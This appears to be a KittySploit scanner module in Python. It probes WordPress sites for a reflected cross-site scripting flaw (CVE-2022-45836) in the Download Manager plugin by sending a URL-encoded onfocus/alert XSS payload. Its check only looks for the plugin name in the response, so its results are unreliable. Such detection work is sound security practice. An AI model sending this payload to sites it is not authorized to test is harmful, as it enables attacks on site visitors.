#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""W3 Eden, Inc."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Download Manager <= 3.2.59 - Reflected XSS Detection',
        'description': "W3 Eden, Inc. Download Manager plugin <= 3.2.59 contains a reflected cross-site scripting caused by insufficient input sanitization, letting attackers execute scripts in the context of the victim's browser, exploit requires attacker to craft a malicious link.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'wp-plugin', 'xss', 'download-manager', 'wpdm', 'wp'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2022-45836',
            'https://patchstack.com/database/wordpress/plugin/download-manager/vulnerability/wordpress-download-manager-plugin-3-2-59-reflected-cross-site-scripting-xss-vulnerability',
        ],
        'cve': 'CVE-2022-45836',
    }

    def run(self):
        path = '/?skw=%22%20onfocus%3D%22alert%28document.domain%29%22%20autofocus%3D%22'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('download-manager',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='WordPress Download Manager <= 3.2.59 - Reflected XSS detected', path=path)
            return True
        return False

